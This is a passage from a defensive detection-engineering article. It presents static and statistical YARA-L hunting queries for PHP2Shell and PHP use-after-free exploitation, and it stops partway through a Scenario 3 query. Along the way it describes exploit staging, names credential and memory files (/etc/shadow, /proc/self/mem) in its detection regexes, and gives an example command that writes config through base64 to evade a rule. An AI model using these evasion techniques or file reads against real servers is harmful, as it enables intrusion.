# Beyond Static Rules: Hunting PHP2Shell and PHP UAF Exploitation with Multi-Stage Behavioral Analytics in Google SecOps

*Authored by Greg Kushmerek — Google Security Operations (Chronicle SIEM & SOAR)*

When critical remote code execution vulnerabilities emerge in foundational web infrastructure—such as the **PHP2Shell** disclosures ([CVE-2026-109618](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109618) and [CVE-2026-109619](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109619)) and related PHP OPcache and session Use-After-Free (UAF) primitives reported by [Wiz Research](https://www.wiz.io/blog/php2shell-php-rce)—detection engineers immediately write point-in-time SIEM rules.

Point-in-time YARA-L 2.0 rules are essential tripwires for known exploit mechanics. However, static rules face an unavoidable trade-off between **evasion resilience** and **alert fatigue**:

1. **Magic Number Fragility**: Static rules rely on hardcoded byte thresholds (`sent_bytes >= 1000000`, `received_bytes >= 60000`), fixed request counts (`#seed >= 50`, `#oom >= 5`), and literal command-line regexes (`fatal_error_backtraces`, `setarch -R`). An attacker who triggers an out-of-memory (OOM) bailout with a 350 KB payload, paces probes slightly slower than a 2-minute window, or base64-encodes a configuration write slips underneath static thresholds.
2. **Operational Noise**: Conversely, loosening static rules floods the SOC with false positives from legitimate large file uploads, developer container debugging (`apache2 -X`, `gdb`), automated vulnerability scanners, and verbose application stack traces.

By combining the two halves of the **Google SecOps Behavioral Analytics Harness**—**`secops-statistical-hunter`** (ad-hoc multi-stage statistical modeling over raw `UDM_EVENTS`) and **`secops-risk-metrics-multistage`** (30-day pre-computed `metrics.*` UEBA baselines)—we can replace brittle magic numbers with self-calibrating statistical models and corroborate whether an exploit attempt actually resulted in host compromise.

> [!NOTE]
> **Self-Contained & Compiler-Verified Code**: Every multi-stage YARA-L 2.0 query in this runbook is aligned with the canonical templates in `secops-statistical-hunter` and `secops-risk-metrics-multistage`, ships with optional Data Table filters commented out so every query runs out-of-the-box without pre-populated tables, and has been **compiled and verified live against the Google SecOps UDM Search compiler**. Note that **CRI** (`[0, 100]`) is computed in Python post-processing by `agentic_ueba` (`ueba_constants.calculate_cri`); the YARA-L queries below emit standardized $Z$ or $Z$-equivalent statistical scores directly.
> 
> New to statistical models like **Zipfian Host-Prevalence IDF**, **Two-Part Hurdles**, **Zero-Inclusive Fano Factor Dispersion**, or **Markov Surprisal**? Jump to the **[Appendix: A Practitioner’s Plain-English Guide to the Statistical Models](#3-appendix-a-practitioners-plain-english-guide-to-the-statistical-models)** at the bottom of this article.

---

## 1. Architectural Overview: Static Rules vs. The Whole UEBA Harness

The table below maps nine detection scenarios across the PHP2Shell and PHP UAF kill chain—comparing traditional point-in-time YARA-L 2.0 rules against their multi-stage behavioral counterparts.

| # | Detection Scenario | MITRE Tactic / Technique | Where the Static YARA-L Rule Struggles | Whole UEBA Harness Strategy |
| :-: | :--- | :---: | :--- | :--- |
| **1** | **PHP Fatal Error Backtrace UAF Staging** | `TA0001` `T1190` | **Evasion**: Base64/hex CLI writes to `php.ini` bypass literal regex; custom mount paths bypass container regex.<br>**FP**: Developers running `apache2 -X` in debug mode. | **1A (`secops-statistical-hunter`)**: Leave-One-Out Two-Part Hurdle (`two_part_hurdle_2stage.yl2`, $H \ge 3.0$) on config file modifications.<br>**1B (`secops-statistical-hunter`)**: Host-Prevalence IDF Zipfian Rarity (`zipfian_process_rarity_2stage.yl2`, $\ln(N_{\text{fleet}}/N_{\text{adopters}}) \ge 2.0$, $\le 2$ hosts). |
| **2** | **PHP OPcache Persistence Bailout & Heap Spray** | `TA0001` `T1190` | **Evasion**: Sub-1MB OOM triggers (`< 1,000,000` bytes) or non-standard URI paths miss.<br>**FP**: Large legitimate upload fails with HTTP 500 and succeeds on retry. | **2A (`secops-statistical-hunter`)**: 2-Stage Causal Sequence (`by 5m`) with 200 KB floor.<br>**2B (`secops-risk-metrics-multistage`)**: Seeded 30d Z-Score (`standard_z_score_2stage.yl2`) on `metrics.network_bytes_outbound` ($Z \ge 3.0\sigma$, `44,979.0` B byte dispersion floor, $\ge 7$ active days). |
| **3** | **OPcache ASLR Disablement & Sensitive File Read** | `TA0006` `T1003.008` | **Evasion**: Reading `/proc/<PID>/maps` by numeric PID instead of `/proc/self/maps` bypasses regex.<br>**FP**: Admin container debugging with `seccomp=unconfined`. | **3A (`secops-statistical-hunter`)**: Leave-One-Out Discrete Poisson Rarity (`poisson_rare_surge_2stage.yl2`, $Z^2 \ge 12.25$, $\ge 7$ online days) on `setarch`/`seccomp` launches.<br>**3B (`secops-statistical-hunter`)**: Leave-One-Out Two-Part Hurdle (`two_part_hurdle_2stage.yl2`, $H \ge 3.0$) on web worker reads of `/etc/shadow`, `/etc/sudoers`, or `/proc/(self\|<PID>)/(maps\|mem\|environ)`. |
| **4** | **Session Upload Progress High-Concurrency Burst** | `TA0001` `T1190` | **Evasion**: Seeding with 35 POSTs instead of $\ge 50$ evades `#seed >= 50`.<br>**FP**: Bulk upload or speedtest endpoints not in hardcoded exclusion regexes. | **4A (`secops-statistical-hunter`)**: Zero-Inclusive Poisson Burst Clustering / Fano Factor (`poisson_burst_clustering_2stage.yl2`, $F = \sigma^2/\mu \ge 4.0$ over $T = 24$ hourly buckets).<br>**4B (`secops-risk-metrics-multistage`)**: HTTP Error Ratio Surge (`http_error_ratio_surge_2stage.yl2`, $Z \ge 3.0\sigma$, $\sqrt{\max(\mu, 1)}$ floor, $\ge 7$ active days) on 30d `metrics.http_queries_fail`. |
| **5** | **Stale Session ID Cross-Request Memory Disclosure** | `TA0009` `T1190` | **Evasion**: Leaking 8 KB–50 KB of heap memory (`< 60,000` bytes) misses.<br>**FP**: Apps returning verbose debug stack traces $> 60$ KB on HTTP 500. | **5 (`secops-statistical-hunter`)**: Standalone 4-Stage MAD / Modified Z-Score (`mad_modified_z_4stage.yl2`, $M_Z > 3.5$, $\ge 7$ active days) on `max(network.received_bytes)` for HTTP 500 responses per server. |
| **6** | **Container Namespace Debugger Attachment (`PS(mod_data)`)** | `TA0004` `T1055.008` | **Evasion**: Attaching by numeric PID without naming `php`/`apache2` on the CLI, or using `ltrace`/`gcore`/`perf`.<br>**FP**: Developers attaching `gdb` on staging hosts. | **6 (`secops-statistical-hunter`)**: Whole-Window Laplace-Smoothed Markov 2-Gram Surprisal (`markov_2gram_transition_rarity_2stage.yl2`, $I = \ln((N_{\text{parent}}+100)/(N_{\text{pair}}+1)) \ge 3.0$) on parent-to-debugger launches. |
| **7** | **Web Worker Crash or Core Dump After OOM** | `TA0001` `T1190` | **FP**: Unstable third-party PHP extensions segfaulting daily on dev/staging servers. | **7 (`secops-statistical-hunter`)**: Leave-One-Out Two-Part Hurdle (`two_part_hurdle_2stage.yl2`, $H \ge 3.0$) on crash handler launches per host (isolates first-time UAF crashes from chronically crashing machines). |
| **8** | **PHP2Shell Web Worker Post-Exploitation RCE** | `TA0002` `T1059.004` | **Evasion**: Requires child binary in allowlist AND specific CLI flags; running `/bin/bash -i`, `id`, or `curl` writing to `/var/www/` misses.<br>**FP**: Legacy `system()` calls (`sendmail`, `wkhtmltopdf`). | **8A (`secops-statistical-hunter`)**: Whole-Window Laplace-Smoothed Markov 2-Gram Surprisal (`markov_2gram_transition_rarity_2stage.yl2`) from web worker parent to *any* child.<br>**8B (`secops-risk-metrics-multistage`)**: 4-Stage Union-Spine Roll-Up Sector Fusion (`rollup_sector_fusion_4stage.yl2`, $D^2 \ge 12.25$ with $\sqrt{2\ln K_{\text{eff}}}$ multiplicity offset) fusing 30d `metrics.file_executions_total` + `metrics.network_bytes_outbound`. |
| **9** | **OOM Bailout & Blind Pointer-Comparison Oracle** | `TA0009` `T1190` | **Evasion**: Pacing probes at 3 OOMs / 12 probes per 2m window evades `#oom >= 5 and #probe >= 20`.<br>**FP**: Automated web vulnerability scanners and load tests. | **9 (`secops-statistical-hunter`)**: Leave-One-Out Conjugate Beta-Binomial Predictive Failure Z-Score (`beta_binomial_failure_4stage.yl2`, $Z_{\text{fail}} \ge 3.0$) on POST requests to PHP endpoints with concurrent fleet failure breadth. |

---

## 2. Scenario-by-Scenario Breakdown & Verified Queries

---

### Scenario 1: PHP Fatal Error Backtrace UAF Staging

#### A. Baseline Static YARA-L 2.0 Rule
Exploiting the `fatal_error_backtraces` Use-After-Free (UAF) condition requires either enabling `fatal_error_backtraces` in PHP/Apache configuration files or launching Apache/PHP in single-worker mode (`-X`) so consecutive requests hit the exact same worker heap. A traditional static detection rule looks like this:

```yara
rule linux_php_fatal_backtrace_uaf_execution {
  meta:
    description = "Detects enabling fatal_error_backtraces in PHP/Apache config files or launching single-worker Apache/PHP processes (-X)."
    severity = "High"
    mitre_tactic = "TA0001"
    mitre_technique = "T1190"

  events:
    $e.principal.platform = "LINUX"
    (
      (
        $e.metadata.event_type = "PROCESS_LAUNCH" and
        (
          (
            re.regex($e.target.process.file.full_path, `/(apache2-foreground|apache2|httpd|php|php-fpm[0-9.]*|php-cgi)$`) nocase and
            re.regex($e.target.process.command_line, `fatal_error_backtraces\s*[= ]\s*(1|On|true)`) nocase
          ) or
          (
            re.regex($e.target.process.file.full_path, `/(podman|docker|nerdctl)$`) nocase and
            re.regex($e.target.process.command_line, `\brun\b.*:/var/www/html(:ro)?\b.*\b(apache2-foreground|apache2|httpd)\s+-X\b`)
          )
        )
      ) or
      (
        ($e.metadata.event_type = "FILE_CREATION" or $e.metadata.event_type = "FILE_MODIFICATION") and
        re.regex($e.target.file.full_path, `/(\.htaccess|\.user\.ini|php\.ini)$`) nocase and
        re.regex($e.principal.process.command_line, `fatal_error_backtraces`) nocase
      )
    )
    $hostname = $e.principal.hostname

  match:
    $hostname over 5m

  condition:
    $e
}
```

#### B. Where the Static Rule Struggles
1. **Trivial Command-Line Obfuscation**: The file modification branch requires `re.regex($e.principal.process.command_line, "fatal_error_backtraces")`. If an attacker writes the setting via base64 (`echo ZmF0YWxfZXJyb3JfYmFja3RyYWNlcz0x | base64 -d >> php.ini`), hex, `sed`, or a script, the static rule is completely blind.
2. **Container Path Rigidity**: To keep developer false positives down, the container branch requires `:/var/www/html(:ro)?\b`. Mounting `/var/www/html/` (with a trailing slash) or `/srv/app` bypasses the regex.

#### C. Whole UEBA Harness Queries

* **Query 1A (`two_part_hurdle_2stage.yl2`)**: Evaluates `FILE_MODIFICATION` on `.htaccess`, `.user.ini`, and `php.ini` without inspecting command-line strings, using a single raw stage with Leave-One-Out intensity standardization ($\sqrt{\max(\sigma_{\text{LOO}}^2, \max(\mu_{\text{LOO}}, 1.0))}$) for active hosts and a discrete awakening branch for dormant hosts ($\le 2$ active days, scoring $3.0 \times \text{Observed}$ so the very first modification crosses $H \ge 3.0$).
* **Query 1B (`zipfian_process_rarity_2stage.yl2`)**: Broadens the `-X` detection to all executions (removing the brittle `/var/www/html` mount filter) and computes pure **Host-Prevalence Inverse Document Frequency** ($\ln(N_{\text{fleet}} / N_{\text{adopters}}) \ge 2.0$) against the total active Linux `PROCESS_LAUNCH` host population, suppressing developer cohorts while catching isolated hosts ($\le 2$ adopter hosts across $\ge 10$ active fleet hosts).

#### Query 1A: Two-Part Hurdle on PHP Configuration Modifications
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect dormant web servers suddenly modifying PHP configuration files (.htaccess, .user.ini, php.ini).
// Statistical Model: Two-Part Hurdle Outlier Model (Single Raw Stage, Dormant Awakening Volume Gate & Positive-Rectified LOO Intensity Z)
// Template: secops-statistical-hunter/templates/pipelines/two_part_hurdle_2stage.yl2
// ============================================================================

stage entity_historical {
    metadata.event_type = "FILE_MODIFICATION"
    re.regex(target.file.full_path, `(?i)/(\.htaccess|\.user\.ini|php\.ini)$`)
    not re.regex(principal.process.file.full_path, `(?i)/(apt|dpkg|yum|dnf|rpm|puppet|chef-client)$`)
    principal.hostname = $entity
    $entity != ""

  match:
    $entity by 1d
  outcome:
    $bucket_count = count(metadata.id)
    $bucket_count_sq = 1.0 * count(metadata.id) * count(metadata.id)
    $distinct_targets = count_distinct(target.file.full_path)
    $sample_target = array_distinct(principal.process.command_line)
}

stage entity_stats {
    $entity = $entity_historical.entity

  match:
    $entity
  outcome:
    $sum_x = sum($entity_historical.bucket_count)
    $sum_x2 = sum($entity_historical.bucket_count_sq)
    $active_samples = count($entity_historical.window_start)
}

$entity = $entity_historical.entity
$entity = $entity_stats.entity
$window_start = $entity_historical.window_start

match:
  $entity, $window_start by 1d

outcome:
  // 6 Core Evidence Pillars
  $observation_count = max($entity_historical.bucket_count)
  $baseline_active_samples = max($entity_stats.active_samples)
  $fleet_prevalence = 0 - 1
  $distinct_binaries = max($entity_historical.distinct_targets)
  $sample_commands = array_distinct($entity_historical.sample_target)

  // Leave-One-Out Continuous Intensity Standardization (Positive-Rectified)
  $raw_n_prior = $baseline_active_samples - 1
  $n_prior = if($raw_n_prior > 1, $raw_n_prior, 1)
  $raw_loo_sum = max($entity_stats.sum_x) - $observation_count
  $loo_sum = if($raw_loo_sum > 0, $raw_loo_sum, 0)
  $baseline_mean = 1.0 * $loo_sum / $n_prior
  $raw_loo_var = ((max($entity_stats.sum_x2) - (1.0 * $observation_count * $observation_count)) / $n_prior) - ($baseline_mean * $baseline_mean)
  $floor_var = if($baseline_mean > 1.0, $baseline_mean, 1.0)
  $safe_var = if($raw_loo_var > $floor_var, $raw_loo_var, $floor_var)
  $baseline_dispersion = math.sqrt($safe_var)
  $raw_intensity_z = ($observation_count - $baseline_mean) / $baseline_dispersion
  $intensity_z = if($raw_intensity_z > 0.0, $raw_intensity_z, 0.0)

  // Dormant Awakening Branch (min_awakening_volume = 1, active_samples <= 2)
  $dormant_raw = 3.0 * (1.0 * $observation_count / 1.0)
  $dormant_score = if($observation_count >= 1, $dormant_raw, 0.0)
  $hurdle_threat_score = if($baseline_active_samples <= 2, $dormant_score, $intensity_z)

condition:
  $observation_count >= 1
  and $hurdle_threat_score >= 3.0

order:
  $hurdle_threat_score desc
```

#### Query 1B: Zipfian Process Rarity on Single-Worker (`-X`) & Backtrace Launches
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect rare single-worker debug (-X) or fatal_error_backtraces executions in the enterprise Zipfian tail.
// Statistical Model: Host-Prevalence Inverse Document Frequency Rarity (Zipf Score = ln(N_fleet_hosts / N_adopter_hosts))
// Template: secops-statistical-hunter/templates/pipelines/zipfian_process_rarity_2stage.yl2
// ============================================================================

stage endpoint_process_burst {
    metadata.event_type = "PROCESS_LAUNCH"
    $etype = metadata.event_type
    re.regex(target.process.file.full_path, `(?i)/(apache2-foreground|apache2|httpd|php|php-fpm[0-9.]*|php-cgi|podman|docker|nerdctl)$`)
    re.regex(target.process.command_line, `(?i)(\s+-X\b|fatal_error_backtraces)`)
    principal.hostname = $host
    $binary = target.process.file.full_path
    $host != ""
    $binary != ""

  match:
    $etype, $host, $binary by 1d

  outcome:
    $endpoint_executions = count(metadata.id)
    $sample_commands = array_distinct(target.process.command_line)
}

stage fleet_process_popularity {
    $etype = $endpoint_process_burst.etype
    $binary = $endpoint_process_burst.binary

  match:
    $etype, $binary

  outcome:
    $fleet_hosts = count_distinct($endpoint_process_burst.host)
    $fleet_total_executions = sum($endpoint_process_burst.endpoint_executions)
}

stage fleet_host_total {
    metadata.event_type = "PROCESS_LAUNCH"
    $etype = metadata.event_type
    principal.hostname != ""

  match:
    $etype

  outcome:
    $total_fleet_hosts = count_distinct(principal.hostname)
}

$etype = $endpoint_process_burst.etype
$etype = $fleet_process_popularity.etype
$etype = $fleet_host_total.etype
$binary = $endpoint_process_burst.binary
$binary = $fleet_process_popularity.binary
$host = $endpoint_process_burst.host
$ws = $endpoint_process_burst.window_start

match:
  $host, $binary, $ws by 1d

outcome:
  $adopter_hosts = max($fleet_process_popularity.fleet_hosts)
  $fleet_total_hosts = max($fleet_host_total.total_fleet_hosts)
  $local_volume = max($endpoint_process_burst.endpoint_executions)
  $commands = array_distinct($endpoint_process_burst.sample_commands)

  $safe_hosts = if($adopter_hosts > 0, $adopter_hosts, 1)
  $safe_fleet_hosts = if($fleet_total_hosts > $safe_hosts, $fleet_total_hosts, $safe_hosts)
  $zipf_rarity_score = math.log(1.0 * $safe_fleet_hosts / $safe_hosts)

  // 6 Core Evidence Pillars
  $observation_count = $local_volume
  $baseline_active_samples = $safe_fleet_hosts
  $baseline_mean = 1.0 * $adopter_hosts / $safe_fleet_hosts
  $baseline_dispersion = $zipf_rarity_score
  $fleet_prevalence = $adopter_hosts
  $distinct_binaries = 1

condition:
  $safe_fleet_hosts >= 10
  and $adopter_hosts <= 2
  and $observation_count >= 1
  and $zipf_rarity_score >= 2.0

order:
  $zipf_rarity_score desc
```

---

### Scenario 2: PHP OPcache Persistence Bailout & Heap Spray Sequence

#### A. Baseline Static YARA-L 2.0 Rule
Exploiting stale OPcache class-cache slots involves sending a large POST request to trigger an OPcache `memory_limit` bailout (`HTTP 500`), immediately followed by a multipart heap-grooming carrier POST (`HTTP 200`):

```yara
rule network_php_opcache_bailout_file_read_chain {
  meta:
    description = "Detects an oversized HTTP POST triggering an HTTP 500 bailout followed by a large HTTP 200 carrier POST from the same client IP."
    severity = "High"
    mitre_tactic = "TA0001"
    mitre_technique = "T1190"

  events:
    $bailout.metadata.event_type = "NETWORK_HTTP"
    $bailout.network.http.method = "POST"
    $bailout.network.http.response_code = 500
    $bailout.network.sent_bytes >= 1000000
    re.regex($bailout.target.url, `(\.php(\b|$|\?)|/sites/default/|/\?q=)`) nocase
    $client_ip = $bailout.principal.ip
    $target_ip = $bailout.target.ip

    $carrier.metadata.event_type = "NETWORK_HTTP"
    $carrier.network.http.method = "POST"
    $carrier.network.http.response_code = 200
    $carrier.network.sent_bytes >= 1000000
    re.regex($carrier.target.url, `(\.php(\b|$|\?)|/sites/default/|/\?q=)`) nocase
    $carrier.principal.ip = $client_ip
    $carrier.target.ip = $target_ip

    $bailout.metadata.event_timestamp.seconds <= $carrier.metadata.event_timestamp.seconds
    $bailout.metadata.id != $carrier.metadata.id

  match:
    $client_ip, $target_ip over 5m

  condition:
    $bailout and $carrier
}
```

#### B. Where the Static Rule Struggles
1. **Arbitrary 1 MB Cutoff**: If a PHP endpoint is near its memory ceiling and bails out on a 300 KB POST request, `sent_bytes >= 1000000` misses the attack.
2. **Legitimate Upload Retries**: Any user uploading a 2 MB document or image that fails with an HTTP 500 timeout and succeeds on immediate retry triggers a false alarm.

#### C. Whole UEBA Harness Queries

We solve this using a **Two-Phase Chained Hunt** (no external Data Table required out of the box):
* **Query 2A (Phase 1 — `secops-statistical-hunter`)**: Lowers the payload floor to `> 200000` bytes and drops the restrictive URL regex, surfacing candidate `($client_ip, $target_ip)` pairs where an HTTP 500 bailout precedes an HTTP 200 carrier within the same `5m` bucket.
* **Query 2B (Phase 2 — `secops-risk-metrics-multistage` — `standard_z_score_2stage.yl2`)**: Seeds the surfaced `$target_ip` values via `/* UPSTREAM_CANDIDATE_IPS */` into a 30-day `metrics.network_bytes_outbound` baseline query ($Z \ge 3.0\sigma$, $\ge 7$ active baseline days, `44,979.0` B byte dispersion floor). A benign upload retry produces $Z \approx 0.0\sigma$ on outbound server egress; an exploit that exfiltrates files or opens a reverse shell spikes $Z \ge 3.0\sigma$.

> [!TIP]
> **Why the Optional Data Table Bridge Is Commented Out by Default**: Referencing an unpopulated Data Table (`%ueba_hunt_bridge.entity`) in YARA-L 2.0 causes a compilation error in tenants where the table has not yet been created. Query 2B therefore ships with `/* UPSTREAM_CANDIDATE_IPS */` seeding enabled and `// principal.asset.ip in %ueba_hunt_bridge.entity` commented out; if automating via SOAR at scale, populate `%ueba_hunt_bridge` (`entity` column) from Query 2A and uncomment that line.

#### Query 2A: Phase 1 Raw Ingress Bailout-to-Carrier Sequence
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect two-stage OPcache HTTP 500 bailout followed by HTTP 200 carrier POST over 5m.
// Statistical Model: Two-Stage Causal Temporal Sequence (secops-statistical-hunter Bridge Extractor)
// ============================================================================

stage stage1_bailout {
    metadata.event_type = "NETWORK_HTTP"
    network.http.method = "POST"
    network.http.response_code = 500
    network.sent_bytes > 200000
    principal.ip = $client_ip
    target.ip = $target_ip
    $client_ip != ""
    $target_ip != ""

  match:
    $client_ip, $target_ip by 5m

  outcome:
    $bailout_count = count(metadata.id)
    $max_bailout_bytes = max(network.sent_bytes)
    $earliest_bailout = min(metadata.event_timestamp.seconds)
}

stage stage2_carrier {
    metadata.event_type = "NETWORK_HTTP"
    network.http.method = "POST"
    network.http.response_code = 200
    network.sent_bytes > 200000
    principal.ip = $client_ip
    target.ip = $target_ip
    $client_ip != ""
    $target_ip != ""

  match:
    $client_ip, $target_ip by 5m

  outcome:
    $carrier_count = count(metadata.id)
    $max_carrier_bytes = max(network.sent_bytes)
    $latest_carrier = max(metadata.event_timestamp.seconds)
    $sample_urls = array_distinct(target.url)
}

$client_ip = $stage1_bailout.client_ip
$target_ip = $stage1_bailout.target_ip
$ws = $stage1_bailout.window_start
$client_ip = $stage2_carrier.client_ip
$target_ip = $stage2_carrier.target_ip
$ws = $stage2_carrier.window_start

match:
  $client_ip, $target_ip, $ws by 5m

outcome:
  $bailout_events = max($stage1_bailout.bailout_count)
  $carrier_events = max($stage2_carrier.carrier_count)
  $bailout_size = max($stage1_bailout.max_bailout_bytes)
  $carrier_size = max($stage2_carrier.max_carrier_bytes)
  $t_bailout = min($stage1_bailout.earliest_bailout)
  $t_carrier = max($stage2_carrier.latest_carrier)

  // 6 Core Evidence Pillars
  $observation_count = $carrier_events
  $baseline_active_samples = $bailout_events
  $baseline_mean = $bailout_size
  $baseline_dispersion = $carrier_size
  $fleet_prevalence = 0 - 1
  $distinct_binaries = 1
  $sample_commands = array_distinct($stage2_carrier.sample_urls)

condition:
  $bailout_events >= 1
  and $carrier_events >= 1
  and $t_bailout <= $t_carrier

order:
  $carrier_size desc
```

#### Query 2B: Phase 2 30-Day Outbound Network Egress Corroboration (Upstream Candidate IP Seeding)
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// ARCHITECTURE: 2-STAGE PARAMETRIC STANDARD Z-SCORE OUTLIER PIPELINE
// Goal: Score 30-day outbound network byte departures on candidate web server IPs surfaced by Phase 1.
// Statistical Model: STANDARD_Z_SCORE (30d Pre-Computed Metrics with 44,979.0 B Fleet Byte Dispersion Floor)
// Template: secops-risk-metrics-multistage/templates/pipelines/standard_z_score_2stage.yl2
// ============================================================================

stage stage1_extract {
    network.sent_bytes > 0
    network.sent_bytes < 1000000000000000
    // Optional SOAR Data Table bridge (uncomment after creating %ueba_hunt_bridge; see note above):
    // principal.asset.ip in %ueba_hunt_bridge.entity
    /* UPSTREAM_CANDIDATE_IPS */
    (principal.asset.ip = "10.0.0.50" or principal.asset.ip = "192.168.1.100")
    principal.asset.ip = $entity
    $entity != ""

  match:
    $entity by 1d

  outcome:
    $observed_val = sum(network.sent_bytes)
    $observed_events = count(metadata.id)

    $historical_avg = max(metrics.network_bytes_outbound(
        period: 1d, window: 30d, metric: value_sum, agg: avg,
        principal.asset.ip: principal.asset.ip
    ))
    $historical_stddev = max(metrics.network_bytes_outbound(
        period: 1d, window: 30d, metric: value_sum, agg: stddev,
        principal.asset.ip: principal.asset.ip
    ))
    $historical_active_days = max(metrics.network_bytes_outbound(
        period: 1d, window: 30d, metric: value_sum, agg: num_metric_periods,
        principal.asset.ip: principal.asset.ip
    ))
    $historical_max = max(metrics.network_bytes_outbound(
        period: 1d, window: 30d, metric: value_sum, agg: max,
        principal.asset.ip: principal.asset.ip
    ))
    $historical_sum = max(metrics.network_bytes_outbound(
        period: 1d, window: 30d, metric: value_sum, agg: sum,
        principal.asset.ip: principal.asset.ip
    ))
}

$entity = $stage1_extract.entity
$ws = $stage1_extract.window_start

match:
  $entity, $ws by 1d

outcome:
  $observed_val = max($stage1_extract.observed_val)
  $baseline_mean = max($stage1_extract.historical_avg)
  $baseline_stddev = max($stage1_extract.historical_stddev)
  $active_days = max($stage1_extract.historical_active_days)
  $events_count = max($stage1_extract.observed_events)

  // Canonical network_bytes_outbound fleet byte dispersion floor = 44,979.0 B
  $safe_stddev = if($baseline_stddev > 44979.0, $baseline_stddev, 44979.0)
  $personal_z = ($observed_val - $baseline_mean) / $safe_stddev

  $observed = $observed_val
  $hist_avg = $baseline_mean
  $hist_stddev = $baseline_stddev
  $z_score = $personal_z

condition:
  $active_days >= 7 and $personal_z >= 3.0

order:
  $personal_z desc
```

---

### Scenario 3: OPcache ASLR Disablement & Sensitive File Read

#### A. Baseline Static YARA-L 2.0 Rule
To make heap layouts deterministic or harvest base addresses for OPcache exploitation, attackers either disable ASLR (`setarch -R` / `seccomp=unconfined`) or use an arbitrary file-read primitive to read `/proc/self/maps`, `/proc/self/mem`, `/proc/self/environ`, or `/etc/shadow`:

```yara
rule linux_php_opcache_aslr_disable_and_file_read {
  meta:
    description = "Detects ASLR disablement via setarch -R / seccomp=unconfined or Apache/PHP workers reading sensitive OS files."
    severity = "High"
    mitre_tactic = "TA0006"
    mitre_technique = "T1003.008"

  events:
    $e.principal.platform = "LINUX"
    (
      (
        $e.metadata.event_type = "PROCESS_LAUNCH" and
        (
          (
            re.regex($e.target.process.file.full_path, `/setarch$`) nocase and
            re.regex($e.target.process.command_line, `\bsetarch\s+(x86_64\s+)?-R\b.*(apache2|httpd|php)`) nocase
          ) or
          (
            re.regex($e.target.process.file.full_path, `/(docker|podman|nerdctl)$`) nocase and
            re.regex($e.target.process.command_line, `--security-opt\s+seccomp=unconfined`) nocase and
            re.regex($e.target.process.command_line, `\b(php|apache2|httpd|opcache)\b`) nocase
          )
        )
      ) or
      (
        ($e.metadata.event_type = "FILE_READ" or $e.metadata.event_type = "FILE_OPEN") and
        re.regex($e.principal.process.file.full_path, `/(apache2|httpd|php-fpm[0-9.]*|php|php-cgi)$`) nocase and
        re.regex($e.target.file.full_path, `^/(etc/(shadow|sudoers)|proc/self/(maps|mem|environ))$`)
      )
    )
    $hostname = $e.principal.hostname

  match:
    $hostname over 5m

  condition:
    $e
}
```

#### B. Where the Static Rule Struggles
1. **Numeric PID Bypass**: The file-read regex only matches `/proc/self/(maps|mem|environ)`. In multi-worker PHP-FPM or Apache pools, reading a sibling worker's memory map by numeric PID (e.g., `/proc/18422/maps`) bypasses the rule.
2. **CI/Build Runner Noise**: Build servers that routinely launch containers with `--security-opt seccomp=unconfined` generate recurring noise.

#### C. Whole UEBA Harness Queries

* **Query 3A (`poisson_rare_surge_2stage.yl2`)**: Uses **Leave-One-Out Discrete Poisson Rarity** over a 14-day Mode B window ($\lambda = (\text{prior runs} + 0.5)/13.0$, $Z^2 = (k - \lambda)^2/\lambda \ge 12.25$) paired with Stage 3 `host_online_baseline` ($\ge 7$ active online UTC days) to flag `setarch` or `seccomp=unconfined` on established hosts where it is historically rare ($\lambda \le 0.5$/day), automatically quieting CI/CD build nodes and newly provisioned ephemeral hosts.
* **Query 3B (`two_part_hurdle_2stage.yl2`)**: Expands the file-read regex to capture both `/proc/self/` and numeric `/proc/[0-9]+/` memory maps, scoring hosts via a single-raw-stage Leave-One-Out Two-Part Hurdle ($H \ge 3.0$).

#### Query 3A: Leave-One-Out Discrete Poisson Rarity on ASLR Disablement (`setarch` / `seccomp`)
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect statistically improbable surges in ASLR disablement (setarch -R / seccomp=unconfined) on established Linux hosts.
// Statistical Model: Leave-One-Out Discrete Poisson Arrival Score (Poisson Z^2 = (k - lambda)^2 / lambda >= 12.25 over 13 prior days)
// Template: secops-statistical-hunter/templates/pipelines/poisson_rare_surge_2stage.yl2
// ============================================================================

stage daily_tool_counts {
    metadata.event_type = "PROCESS_LAUNCH"
    principal.hostname = $entity
    $entity != ""
    $tool = target.process.file.full_path
    $tool != ""
    (
      re.regex(target.process.file.full_path, `(?i)/setarch$`)
      or re.regex(target.process.command_line, `(?i)(\bsetarch\b.*-R\b|seccomp=unconfined)`)
    )

  match:
    $entity, $tool by 1d
  outcome:
    $daily_count = count(metadata.id)
    $distinct_cmds = count_distinct(target.process.command_line)
    $bucket_max_ts = max(metadata.event_timestamp.seconds)
}

stage baseline_accumulation {
    $entity = $daily_tool_counts.entity
    $tool = $daily_tool_counts.tool

  match:
    $entity, $tool
  outcome:
    $total_hist_runs = sum($daily_tool_counts.daily_count)
    $tool_active_days = count($daily_tool_counts.window_start)
}

stage host_online_baseline {
    metadata.event_type = "PROCESS_LAUNCH"
    principal.hostname = $entity
    $entity != ""
    $utc_date = timestamp.get_date(metadata.event_timestamp.seconds, "UTC")

  match:
    $entity
  outcome:
    $online_days = count_distinct($utc_date)
    $host_max_ts = max(metadata.event_timestamp.seconds)
}

$entity = $daily_tool_counts.entity
$tool = $daily_tool_counts.tool
$entity = $baseline_accumulation.entity
$tool = $baseline_accumulation.tool
$entity = $host_online_baseline.entity
$ws = $daily_tool_counts.window_start

match:
  $entity, $tool, $ws by 1d
outcome:
  $today_k = max($daily_tool_counts.daily_count)
  $total_hist = max($baseline_accumulation.total_hist_runs)
  $raw_prior_runs = $total_hist - $today_k
  $prior_runs = if($raw_prior_runs > 0, $raw_prior_runs, 0)
  $lambda = ($prior_runs + 0.5) / 13.0

  // 6 Core Evidence Pillars
  $observation_count = $today_k
  $baseline_active_samples = max($host_online_baseline.online_days)
  $baseline_mean = $lambda
  $baseline_dispersion = $lambda
  $fleet_prevalence = 0 - 1
  $distinct_binaries = max($daily_tool_counts.distinct_cmds)

  // Aggregate Poisson Squared Score & Latest-Day Gate
  $diff = $today_k - $lambda
